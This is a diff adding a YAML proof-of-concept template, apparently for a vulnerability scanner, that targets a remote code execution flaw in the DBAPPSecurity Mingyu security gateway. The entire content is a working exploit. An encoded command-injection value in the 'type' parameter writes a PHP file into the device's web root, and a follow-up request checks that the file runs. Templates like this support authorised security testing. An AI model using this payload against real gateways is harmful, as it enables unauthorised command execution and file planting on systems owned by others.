@@ -1,0 +1,19 @@
+id: poc-yaml-ah-mingyu-security-gateway-rce
+info:
+  name: 安恒 明御安全网关 远程代码执行漏洞
+  severity: high
+  tags:
+  - rce
+  - 两高一弱
+  finger: 明御安全网关
+variables:
+  t1: random_str(3)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /webui/?g=aaa_portal_auth_config_reset&type=1%3Becho%20'%3C%3Fphp%20echo%20md5("{{.t1}}")%3B%3F%3E'%20%3E%2Fusr%2Flocal%2Fwebui%2Ftest.php%3B
+  expression: status_code == 200 && contains(body,t1) && content_type == "text/html"
+- method: GET
+  path: /test.php
+  expression: status_code == 200 && contains(body,t2)
+transport: http
